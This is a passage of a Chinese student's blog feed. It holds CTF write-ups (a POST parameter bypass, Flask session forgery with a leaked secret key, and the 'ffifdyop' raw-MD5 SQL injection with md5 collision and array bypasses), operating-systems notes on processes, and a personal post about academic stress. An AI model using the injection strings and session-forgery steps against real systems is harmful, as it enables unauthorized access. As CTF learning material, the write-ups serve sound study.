src="https://s2.loli.net/2022/01/12/uE4vDJANsGgTnwb.png"></p><p>这里要post一个password为404过去而且password不能是数字,所以是404a</p><p>但是你👱🏻‍用hackbarPOST了过后没回显,你👱🏻‍无奈了只能用burpsuite。</p><p><img src="https://s2.loli.net/2022/01/12/rVfEkjc781XgYm6.png"></p><p>这里cookie的user 按理说应该是1,因为正常情况下这里是应该要得到回显的</p><p>这里你👱🏻‍传入password=404a和money=100000000,成功登入但是提示我数字太长,于是该用科学记数法。</p><p><img src="https://s2.loli.net/2022/01/12/GAUzrp7LRm48ne5.png"></p><p>这里最开始抓的包是GET,需要改成POST,不能直接把GET换成POST而是需要用这个改</p><p><img src="https://s2.loli.net/2022/01/12/RhAbYciONlW1eFj.png"></p><p>这里成功拿下flag</p><p><img src="https://s2.loli.net/2022/01/12/aPHFbj46hfZT39w.png"></p><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>这道题你👱🏻‍开始试着账号叫admin 密码叫123登陆 直接拿到flag结束<br>但是你👱🏻‍既然是专门刷题的,那必须玩儿明白了</p><p>这里你👱🏻‍还是走正常流程,先注册个号登进去,进去后有index,post,change password,logout</p><p><img src="https://s2.loli.net/2022/01/12/tv67rEGSPjFc4Up.png"></p><p>你👱🏻‍在changepassword这里找到了失落滴宝藏,于是摸过去</p><p>这个代码量是目前你👱🏻‍见过的最多的了,而且这个知识点也是你👱🏻‍以前从来没接触过的那种,终于在提示下找到了config.py里面的密钥为ckj123,为什么要密钥呢,因为这里需要对flask session进行伪造,而flask的session在客户端里,所以可以整活,而破解需要密钥。</p><p>而这道题就是要你👱🏻‍用admin的身份进行登录。</p><p><img src="https://s2.loli.net/2022/01/14/eFsYcZzH7G3it42.png"></p><p>这里找到密钥为ckj123</p><p>通过登录成功抓包到session</p><p><img src="https://s2.loli.net/2022/01/14/C6pn5vGNsX8geTo.png"></p><p>将session解密</p><p><img src="https://s2.loli.net/2022/01/14/tSIzs7c3YwuDEhm.png"></p><p>这里将name更换成admin后进行再加密</p><p><img src="https://s2.loli.net/2022/01/14/rQOPM4VzmvtsHoi.png"></p><p>这里拿到flag</p><p><img src="https://s2.loli.net/2022/01/14/AdVYwCBhTjWiSse.png"></p><p>其实你👱🏻‍做出来了仔细想想原理还是挺简单的。</p><p>什么事后诸葛亮</p><p>这个加解密脚本是你👱🏻‍偷的 地址在这里</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p><img src="https://s2.loli.net/2022/01/14/7dCscnDLexvA5To.png"></p><p>你👱🏻‍查看源代码 发现这里是GET传参</p><p><img src="https://s2.loli.net/2022/01/14/MtTu7Pp8jkBKLwW.png"></p><p>这里看消息头可以看到提示</p><p><img src="https://s2.loli.net/2022/01/14/OZQM9uIK4S5pax7.png"></p><p><strong>关于password=md5($pass,true)</strong></p><p>这里你👱🏻‍是看wp的时候搬运的</p><p>首先说一下关于md5(string,raw)的定义，</p><p><img src="https://img-blog.csdnimg.cn/20210206225921825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210206231350127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70"></p><pre><code>content: ffifdyophex: 276f722736c95d99e921722cf9ed621craw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1cstring: &#39;or&#39;6]!r,b这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是  &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c  这种。   上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  &#39;  \  &#39;后面的3个字符连同&#39;  \  &#39;算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。   然后我们可以用’ffifdyop‘带入，看一下实际的效果。</code></pre><p><img src="https://img-blog.csdn.net/20180726172510307?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01hcmNoOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><img src="https://img-blog.csdn.net/2018072617260317?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01hcmNoOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p> 这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是’    ‘    ‘字符。6f就是对应‘    o    ’。</p><p> 然后我们得到的sql语句就是 SELECT * FROM admin WHERE username = ‘admin’ and password = ‘’or’6�]��!r,��b’</p><p> 为什么password = ‘’or’6�]��!r,��b’的返回值会是true呢，因为or后面的单引号里面的字符串（6�]��!r,��b），是数字开头的。当然不能以0开头。（我不知道在数据库里面查询的时候，�这种会不会显示）</p><p> 这里引用一篇文章，连接在下面，里面的原话“a string starting with a 1 is cast as an integer when used as a boolean.“</p><p> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。</p><p> 当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p><p> 表里就只有一条数据，用于测试。</p><p><img src="https://img-blog.csdn.net/20180726204901212?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01hcmNoOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><img src="https://img-blog.csdn.net/20180726204920377?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01hcmNoOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><img src="https://img-blog.csdn.net/20180726205005573?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01hcmNoOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><img src="https://img-blog.csdn.net/20180726205021666?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01hcmNoOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>  所以到这里为止，就完成了sql注入。同时要注意的是，这种sql语句，在mysql里面是可以行得通的，但是在oracle数据库里面这样的语句是有语法错误的。</p><p>  所以回过头来为什么ffifdyop就是答案，因为ffifdyop的md5的原始二进制字符串里面有‘or’6这一部分的字符。那么进一步思考这个单引号是否是必要的，这两个单引号是为了与原有的语句的单引号配对。所以我们理解了这个sql注入的原理，那么就明白了我们需要怎样的字符串。</p><p>所以你👱🏻‍输入ffifdyop后跳转了页面</p><p><img src="https://s2.loli.net/2022/01/14/obiYe6FgC4kGx7l.png"></p><p>你👱🏻‍查看源代码发现这里是md5弱碰撞</p><p><img src="https://s2.loli.net/2022/01/14/ycovjnwt2g1FzS6.png"></p><p>你👱🏻‍找了一对md5相同的字符串 Get传参</p><p>?a=QNKCDZO&amp;b=s155964671a</p><p>跳转到下一个页面 这里是md5强比较</p><p><img src="https://s2.loli.net/2022/01/14/fW1HNZUCIhuTsnw.png"></p><p> 数组进行绕过，因为md5不能处理数组，所以md5(param1[])返回false,===两边都返回false，自然就相等（同样弱比较也可以用数组绕过进行操作）</p><p><img src="https://s2.loli.net/2022/01/14/vJUxyCYTMk4hei7.png"></p><p>得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;你👱🏻‍滴快乐寒假 开始辽&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;因为你👱🏻‍再摸鱼滴话就要get out了&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;ACTF2020-新生赛-BackupFile&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>操作系统 two</title>
    <link href="http://example.com/2021/11/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-two/"/>
    <id>http://example.com/2021/11/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-two/</id>
    <published>2021-11-15T03:38:02.000Z</published>
    <updated>2021-11-15T03:42:08.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="这是你👱🏻‍的亡🐏补牢-因为你👱🏻‍马上就要被🐏了"><a href="#这是你👱🏻‍的亡🐏补牢-因为你👱🏻‍马上就要被🐏了" class="headerlink" title="这是你👱🏻‍的亡🐏补牢 因为你👱🏻‍马上就要被🐏了"></a>这是你👱🏻‍的亡🐏补牢 因为你👱🏻‍马上就要被🐏了</h1><p>你👱🏻‍在操作系统这里相比于其他的确实沾点沉默寡言，你👱🏻‍觉得复习这玩意就沾点恶心，让你👱🏻‍怀疑你👱🏻‍是不是学的文科，怎么这么🐔8️⃣多东西，也不说个重点，就🐔8️⃣硬看。</p><p>(里面的很多图片都是你👱🏻‍搞的别处的，必须声明一下防止被🐏，你👱🏻‍只是个搬运工 但是你👱🏻‍还是发表点看法)</p><h1 id="前趋图和程序执行"><a href="#前趋图和程序执行" class="headerlink" title="前趋图和程序执行"></a>前趋图和程序执行</h1><h2 id="前趋图"><a href="#前趋图" class="headerlink" title="前趋图"></a>前趋图</h2><p>前趋图，是指一个有向无环图，它用于描述进程之间执行的先后顺序。</p><p>图中的每个节点均可用于表示一个进程或一段程序，甚至是一条语句，节点间的有向边则表示两个节点之间所存在的偏序或前趋关系。</p><p>你👱🏻‍给你整个题让你clear一下。<br>画出下面4条语句的前趋图（符号“:=”是赋值的意思）<br>S1：a：=x+y</p><p>S2：b：=z+1</p><p>S3：c：=a-b</p><p>S4：w：=c+1</p><p>分析：</p><p>S1与S2可以并发执行，因为它们互不依赖；</p><p>但是S3必须在a（S1）、b（S2）被赋值后才能执行，S4必须在c（S3）之后才能执行。</p><p>画图：</p><p>具有如图所示的前趋关系：</p><p><img src="https://img-blog.csdnimg.cn/20200302194133246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjIxODc4MQ==,size_16,color_FFFFFF,t_70"></p><p>你👱🏻‍：more！</p><p>画出下面6条语句的前趋图（符号“:=”是赋值的意思）</p><p>S1：a:=x + y; </p><p>S2：b:=z + 1; </p><p>S3：c:=a - b; </p><p>S4：e:=c+1;</p><p>S5：f:=c+a;</p><p>S6：g:=e * f;</p><p>分析：<br>S1与S2可以并发执行，因为它们互不依赖；但是S3必须在a（S1）、b（S2）被赋值后才能执行，S4必须在c（S3）之后才能执行，S5必须在c（S3）被赋值后才能执行，S6必须在e（S4）、f（S5）被赋值后才能执行。</p><p>画图：</p><p>具有如图所示的前趋关系：</p><p><img src="https://img-blog.csdnimg.cn/20200304201031442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjIxODc4MQ==,size_16,color_FFFFFF,t_70"></p><h2 id="程序顺序执行"><a href="#程序顺序执行" class="headerlink" title="程序顺序执行"></a>程序顺序执行</h2><p>1.程序的顺序执行<br>顺序执行：按照顺序进行执行。</p><pre><code>顺序性：严格按照顺序执行，前一个结束后一个才能执行封闭性：程序运行时独占资源，只有程序本身才能改变机器各种资源的状态。可再现性：结果与执行速度无关，只与初始条件有关。给定相同的输入，输出结果一定相同。</code></pre><p>2.程序的并发执行</p><p>多道程序系统执行环境的变化可以引起多道程序的并发执行。一组在逻辑上相互独立的程序或程序段在执行过程中其执行时间在客观上相互重叠，即一个程序尚未结束、另一个程序的执行已经开始的执行方式。</p><pre><code>间断性：共享资源的使用使得在并发程序之间有相互制约。相互制约导致并发程序具有：执行-暂停-执行 这种间断性的活动规律。失去封闭性：多个程序共享资源，执行时必定会受到其他程序的影响。不可再现性：失去封闭性，也同时失去了不可再现性。资源的利用状况和环境有关，不能保证每次同一个输入有着相同的输出。</code></pre><h1 id="进程的描述"><a href="#进程的描述" class="headerlink" title="进程的描述"></a>进程的描述</h1><h2 id="进程的定义与特征"><a href="#进程的定义与特征" class="headerlink" title="进程的定义与特征"></a>进程的定义与特征</h2><p>对于进程，从不同的角度可以给出不同的定义，其中有</p><pre><code>行为的一个规则叫做程序，程序在处理机上执行时所发生的活动称为进程。具有一定功能的程序在某个数据集合上的一次活动。进程是一个程序与其数据一道通过处理机的执行所发生的活动。进程是指进程实体的运行过程，是系统进行资源分配和调度的独立单位。程序的执行过程，从开始到结束</code></pre><p>你👱🏻‍：多少沾点屁事多，不给你👱🏻‍个准信</p><p>进程的特征：</p><pre><code>结构性：由程序（段）、数据（段）、进程控制块（PCB）三部分组成；动态性：进程是程序的执行过程；并发性：多个进程可同存于内存中，能在一段时间内同时运行；独立性：独立运行的基本单位，独立获得资源和调度的基本单位；异步性：各进程按各自独立的不可预知的速度向前推进。 </code></pre><p>进程与程序的区别：<br>    程序是指令的有序集合，其本身没有任何运行的含义，是一个静态的概念。而进程是程序在处理机上的一次执行过程，它是一个动态的概念。程序是静态的，进程是动态的；</p><pre><code>程序可以作为一种软件资料长期存在，而进程是有一定生命期的。程序是永久的，进程是暂时的；进程更能真实地描述并发，而程序不能；进程是由程序和数据、进程控制块PCB三部分组成的；进程具有创建其他进程的功能，而程序没有同一程序同时运行于若干个数据集合上，它将属于若干个不同的进程。也就是说同一程序可以对应多个进程 </code></pre><p>属于是你👱🏻‍的意外收获</p><h2 id="进程的基本状态与转换"><a href="#进程的基本状态与转换" class="headerlink" title="进程的基本状态与转换"></a>进程的基本状态与转换</h2><p>1.进程的3种基本状态</p><p>就绪状态（Ready  R态）：存在于处理机调度队列中的所有进程，它们已经准备就绪，一旦得到CPU，就立即可以运行。这些进程所处的状态为就绪状态</p><p>运行状态（Running  E态）：正在运行的进程所处的状态为运行状态</p><p>等待/阻塞/睡眠状态（Wait/Blocked   B态）：若一进程正在等待某一事件发生（如等待输入输出工作完成），这时，即使给它CPU，它也无法运行，称该进程处于等待状态（阻塞、 睡眠、封锁状态）</p><p>就绪队列：处于就绪状态的进程按一定的策略排队，同一时刻可有多个就绪队列。</p><p>阻塞队列：根据阻塞原因可以设置多个队列。</p><p>进程的状态变迁图：</p><p><img src="https://img-blog.csdn.net/20180701115547834?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjYxNDkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>状态进程模型：</p><p><img src="https://img-blog.csdn.net/20180701115723671?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjYxNDkw/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>你👱🏻‍觉得挺有用的brainstorm：如果系统中有N个进程，运行的进程最多几个，最少几个；就绪进程最多几个最少几个；等待进程最多几个，最少几个？</p><p>运行：1    0</p><p>就绪：N-1 0</p><p>等待：N   0</p><h2 id="挂起操作和进程状态的转换"><a href="#挂起操作和进程状态的转换" class="headerlink" title="挂起操作和进程状态的转换"></a>挂起操作和进程状态的转换</h2><p>1.挂起操作的引入<br>引入挂起操作主要是为了满足下列需要</p><pre><code>     终端用户的需要     父进程的需要     负荷调节的需要     OS的需要</code></pre><p>2.引入挂起操作后进程3个基本状态间的转换</p><pre><code>     活动就绪➡️禁止就绪     活动阻塞➡️静止阻塞     静止就绪➡️活动就绪     静止阻塞➡️活动阻塞        </code></pre><p><img src="https://img-blog.csdnimg.cn/20210113132636298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDY2Nzg4,size_16,color_FFFFFF,t_70"><br>3.引入挂起操作后进程5个基本状态间的转换</p><pre><code>     NULL➡️创建：     创建➡️活动就绪：     创建➡️静止就绪：     执行➡️终止：</code></pre><p>你👱🏻‍：增加了创建状态和终止状态后，具有挂起状态的进程状态图<br><img src="https://img-blog.csdnimg.cn/20210113132809949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDY2Nzg4,size_16,color_FFFFFF,t_70"></p><p>你👱🏻‍：整点例题耍耍</p><p>下列选项中，会导致进程从执行态变为就绪态的事件是(【D】)。(2015年考研统考真题)</p><p>A. 执行P操作</p><p>B. 申请内存失败</p><p>C. 启动I/O设备</p><p>D. 被高优先级进程抢占</p><p>A、B和C都因为请求某一资源会进入阻塞态，而D只是被剥夺了处理机资源，进入就绪态，一旦得到处理机即可运行</p><p>下列选项中，可能导致当前进程P阻塞的事件是(【AB】)。(2018年考研统考真题)</p><p>A. 进程P申请临界资源</p><p>B. 进程P从磁盘读数据</p><p>C. 系统将CPU分配给高优先权的进程</p><p>D. 上述答案都对</p><p>进程等待某资源为可用（不包括处理机）或等待输入输出完成均会进入阻塞态，即A,B正确；</p><p>系统将CPU分配给高优先权的进程，会使当前进程从运行态变为就绪态，即 C错误</p><h2 id="进程管理中的数据结构"><a href="#进程管理中的数据结构" class="headerlink" title="进程管理中的数据结构"></a>进程管理中的数据结构</h2><p>1.OS中用于管理资源和控制进程的数据结构</p><p>2.PCB的作用<br>为了便于系统描述和管理进程，OS为每个进程专门定义一个数据结构——PCB</p><p>PCB是OS中最重要的记录型数据结构</p><pre><code>PCB是OS感知进程存在的唯一标志。进程与PCB是一一对应的。PCB随进程创建而建立，随进程结束而回收PCB应常驻内存</code></pre><p>PCB的作用是使一个在多道程序环境下不能独立运行的程序，成为一个能独立运行的基本单位。</p><p>作用：</p><pre><code>  作为独立运行基本单位的标志  实现间断性运行方式  提供进程管理所需要的信息  提供进程调度所需要的信息  实现与其他进程的同步与通信</code></pre><p>3.PCB中的信息</p><p>   进程标识符（唯一，通常是一个整数）</p><pre><code>  外部标识符（方便用户或者进程对进程的访问，须为每个进程设置一个外部标识符，由创建者提供，通常由字母和数字组成。为了描述进程的家族关系，还应设置父进程标识符和子进程标识符。此外，还可设置用户标识符，以指示拥有该进程的用户）  内部标识符（为了方便系统对进程的使用，赋予每个进程唯一的一个数字标识符，通常是一个进程的符号）</code></pre><p>   处理机状态</p><p>处理机状态信息，也称为处理机的上下文，主要是由处理机的各种寄存器中的内容组成的。</p><p>寄存器：<br>    (1)通用寄存器<br>    (2)指令计数器<br>    (3)程序状态字寄存器<br>    (4)用户栈指针寄存器</p><p>   进程调度信息</p><p>OS在进行进程调度时，必须了解进程的状态以及有关进程调度的信息，这些信息，这些信息包括：</p><pre><code>进程状态进程优先级进程调度所需要的其他信息事件（指进程由执行状态转换为阻塞状态所等待发生的事件，即阻塞原因）</code></pre><p>   进程控制信息：</p><pre><code>程序和数据的地址进程同步和通信机制资源清单链接指针</code></pre><p>PCB的组织方式<br>  常用的组织方式有以下3种：</p><p>   线性方式(将所有PCB都放到一个表(连续的线性存储区)中)</p><p>   链接方式(建立索引表和阻塞索引表，用指针连接)</p><p><img src="https://img-blog.csdn.net/20171103213210315?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FueWFucnV4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"></p><p>   索引方式(将PCB组成队列，形成就绪队列、阻塞队列、运行队列等等)</p><p><img src="https://img-blog.csdn.net/20171103213202378?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FueWFucnV4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"></p><p>你👱🏻‍：不来点例题怎么表示会了</p><p><img src="https://img-blog.csdnimg.cn/20201104192552412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg5OTA2OQ==,size_16,color_FFFFFF,t_70#pic_center"></p><p>图中()</p><pre><code>A.有1个运行进程、2个就绪进程、4个阻塞进程B.有2个运行进程、3个就绪进程、2个阻塞进程C.有1个运行进程、3个就绪进程、3个阻塞进程D.有1个运行进程、4个就绪进程、2个阻塞进程</code></pre><p>从图中可看出， 每个索引表指向了三个PCB， 因此就绪进程和阻塞进程都是3个</p><p>你👱🏻‍:选C</p><h1 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h1><h2 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h2><p>1.进程的层次结构</p><p>在OS中，允许一个进程创建另一个进程，通常把创建进程的进程称为父进程，而被创建的进程称为子进程。子进程可以继续创建其自己的子进程，由此便形成了进程的层次结构。</p><p>子进程可以继承父进程所拥有的资源，撤销父进程时，也必须同时撤销其所有子进程。</p><p>2.进程图</p><p>为了形象描述一个进程的家族关系而引入了进程图（你👱🏻‍：树状图看得懂吧）</p><p>3.引起进程创建的事件</p><pre><code>     用户登录     作业调度     提供服务     应用请求</code></pre><p>4.进程的创建</p><p>在系统中每当出现创建新进程的请求时，OS便会调用进程创建原语，并按以下步骤创建一个新进程</p><pre><code>  申请空白PCB  为新进程分配其运行所需的资源，包括各种物理和逻辑资源  初始化PCB  如果进程就绪队列能够接纳新进程，就将新进程插入就绪队列</code></pre><p>当进程创建新进程时，有两种执行的可能：</p><pre><code>  父进程与子进程并发执行  父进程等待，直到某个或全部子进程执行完毕</code></pre><p>新进程的地址空间也有两种可能</p><pre><code>  子进程是父进程的复制品  子进程加载另一个新程序</code></pre><h2 id="进程的终止"><a href="#进程的终止" class="headerlink" title="进程的终止"></a>进程的终止</h2><p>1.引起进程终止的事件</p><pre><code>  正常结束(进程的任务已经完成，准备退出运行)  异常结束(程序在运行时，发生了某种异常事件，使得程序无法继续运行)  外界干预(指进程应外界的请求而终止运行)</code></pre><p>2.进程的终止过程</p><p>当系统中发生了要求终止进程的某事件后，OS便会调用进程终止原语，按下述步骤终止指定的进程：</p><pre><code>   根据被终止进程的标识符，从PCB集合中检索出该进程的PCB，并从该进程的PCB中读出该进程的状态     若处于执行态，则立刻终止该进程的执行，并指示该进程被终止后应重新进行调度      若该进程还有子孙进程，则还应终止其所有子孙进程      将被终止的进程所有的全部资源，或归还给其父进程，或归还给系统      将被终止进程的PCB从所在队列中移出，等待其他程序来搜集信息</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;这是你👱🏻‍的亡🐏补牢-因为你👱🏻‍马上就要被🐏了&quot;&gt;&lt;a href=&quot;#这是你👱🏻‍的亡🐏补牢-因为你👱🏻‍马上就要被🐏了&quot; class=&quot;headerlink&quot; title=&quot;这是你👱🏻‍的亡🐏补牢 因为你👱🏻‍马上就要被🐏</summary>
      
    
    
    
    
    <category term="亡🐏补牢" scheme="http://example.com/tags/%E4%BA%A1%F0%9F%90%8F%E8%A1%A5%E7%89%A2/"/>
    
  </entry>
  
  <entry>
    <title>银们各自生活</title>
    <link href="http://example.com/2021/11/15/%E9%93%B6%E4%BB%AC%E5%90%84%E8%87%AA%E7%94%9F%E6%B4%BB/"/>
    <id>http://example.com/2021/11/15/%E9%93%B6%E4%BB%AC%E5%90%84%E8%87%AA%E7%94%9F%E6%B4%BB/</id>
    <published>2021-11-15T03:36:27.000Z</published>
    <updated>2021-11-15T03:44:58.287Z</updated>
    
    <content type="html"><![CDATA[<p>你👱🏻‍技术性博客没写几个就想整个生活blog了，哪怕根本没人看。</p><p>其实你👱🏻‍想写这个很久了，但是你👱🏻‍没时间去写，只能东拼西凑点时间写，所以你👱🏻‍写的跟个精神分裂患者一样。</p><p>你👱🏻‍这学期就是被瓜分的一学期。</p><p>你👱🏻‍要补大一上的课，高🌲，🐔导，网安导论。</p><p>你👱🏻‍要大二上课内的课，但是这些💩🐴课都难学，你👱🏻‍还不能分配太多时间</p><p>你👱🏻‍要做实验班的支线任务，做网站，做漏洞扫描平台，老师什么都不教，只当个发布任务的NPC，随口不动脑子的一句话所有人却要为此付出大量时间。</p><p>你👱🏻‍还要学CTF，有的比赛你👱🏻‍还得去打，一打就是通宵达旦一两天。</p><p>你👱🏻‍还要准备六级，虽然你👱🏻‍到时候大概率是白给。</p><p>你👱🏻‍还要面对各种实验，各种装环境，经常是一装一天都弄不好。</p><p>就连你👱🏻‍打个Apex，都还要注意不要干💩🐴事情，免得以后车队不要你👱🏻‍了</p><p>你👱🏻‍很喜欢一句话：</p><p><img src="https://i.loli.net/2021/11/15/qPzmhnxyQEd8LHV.png"></p><p>如果觉得你👱🏻‍就是喜欢卖惨，喜欢抱怨，不想看下去的话，你👱🏻‍觉得可以滚了，你把你👱🏻‍当成物质上的人，你👱🏻‍也这样看你。</p><p>你👱🏻‍已经这样了，然而是什么呢？</p><p>你👱🏻‍做出来的网站被老师指指点点，说你👱🏻‍功能做少了，游戏源码要自己写，你👱🏻‍看了一下游戏源码大概十几万行，然而你👱🏻‍只有两周时间，你👱🏻‍也不是只学这门课。</p><p>你👱🏻‍因为上学期拉了，大一上因为转专业基本上没算，又损失一学期德育分，这学期综评自然就很拉，又被一些人阴阳怪气，哈哈，什么臭🐟烂🦐都能来骑你👱🏻‍脸了。</p><p>你👱🏻‍看着CTF群里大🔥们都在讨论题目，你👱🏻‍只能先复习，你👱🏻‍看着别人讨论的东西越来越炫酷直到你👱🏻‍看不懂，你👱🏻‍确实无法把全部献给CTF，反正也觉得你👱🏻‍不是那块料，你👱🏻‍问个题，跟你👱🏻‍说无法识别你的提问方式，你👱🏻‍学个东西为什么还要卑躬屈膝，一点正反馈都没有，你👱🏻‍凭什么去学。</p><p>你👱🏻‍就连打个Apex还被队友各种说：“你打你🐴400个小时了，怎么还没上钻石”，<img src="https://i.loli.net/2021/11/15/uVmYPwp2IsxGXQv.png">，你👱🏻‍是Apex专业的是吧。‍</p><p>你👱🏻‍原来觉得，变得很忙是好事，变的很忙会变强，变得很强就能有人理你👱🏻‍了，然而你👱🏻‍发现银们都是各自生活，你👱🏻‍每次发言都仿佛一个🤡一样自我拉扯，在聊天软件中你👱🏻‍出现一般是这样。</p><pre><code>                      10:42:21</code></pre><p>🧑：諸閦隸僧閦降閦吽諸閦陀摩閦隸閦僧閦缽閦薩咤尊閦如閦如</p><p>🧑🏻: 諸隸諳僧降諳吽諸諳陀諳摩諳隸諳僧諳缽薩諳咤諳薩諳如諳如諳</p><p>閦諸閦隸閦僧閦降閦吽諸閦陀閦摩閦隸僧閦缽薩閦咤閦薩閦薩閦如閦    ：你👱🏻‍</p><pre><code>                      11：49:23</code></pre><p>🧑🏼：冥諸冥隸冥僧冥降冥吽諸冥陀冥摩冥隸僧冥缽薩咤冥尊冥薩如冥</p><p><img src="https://i.loli.net/2021/11/15/uVmYPwp2IsxGXQv.png"></p><p>你👱🏻‍的消息仿佛跟加了注释符号一样不被系统读取，那既然不想理你👱🏻‍就可以不要披着好友的皮，把你👱🏻‍拉进去活跃气氛，可能是在大佬眼中，你👱🏻‍的问题是简单的，低能的，别人的问题是有意义的，interesting的，所以不予回答。</p><p>你👱🏻‍高中的时候背的作文素材大部分已经忘了，但是你👱🏻‍确实还记得一句：“每当你觉得想要批评什么人的时候,你切要记着,这个世界上的人并非都具备你禀有的条件。”</p><p>你👱🏻‍接触编程时间是今年3月到现在8个月，有的人高中就开始打比赛，就对你👱🏻‍各种示意敌人已不见踪影，“为什么这个算法都不知道啊”，“这道题，不随便🐏？”，觉得你👱🏻‍没学好就是因为你👱🏻‍懒，你👱🏻‍确实还需要吃饭和睡觉，<img src="https://i.loli.net/2021/11/15/uVmYPwp2IsxGXQv.png">。</p><p>凭什么你👱🏻‍比🐶都忙，还是被各种看不起</p><p>凭什么你👱🏻‍辛辛苦苦做出来的东西还被人不尊重</p><p>凭什么别银都是组排，你👱🏻‍是单排</p><p>凭什么你👱🏻‍大学难度这块一直都比别银高，还要作同等评价</p><p>为什么你👱🏻‍突然要来发神经呢，因为你👱🏻‍感觉这几周每天都过得异常奇怪，于是突发奇想去做个测试</p><p><img src="https://i.loli.net/2021/11/15/9DfZx5pnQJ4sCWK.jpg"></p><p>估计又有银说：这个测试是假滴，都是假滴</p><p>你👱🏻‍：<img src="https://i.loli.net/2021/11/15/uVmYPwp2IsxGXQv.png"></p><p>你👱🏻‍觉得差不多可以闭关锁国了</p><p>你👱🏻‍觉得阴阳怪气你👱🏻‍的银可以滚了</p><p>你👱🏻‍觉得把你👱🏻‍当成物质银的银可以滚了</p><p>你👱🏻‍觉得有事没事沉默你👱🏻‍的银可以滚了</p><p>当然也可以自己滚</p><p>你👱🏻‍的队友只有你👱🏻‍。</p><p>你👱🏻‍已经无语凝噎。</p><p>有个true friend确实是一件最难的事。</p>]]></content>
    
    
      
      
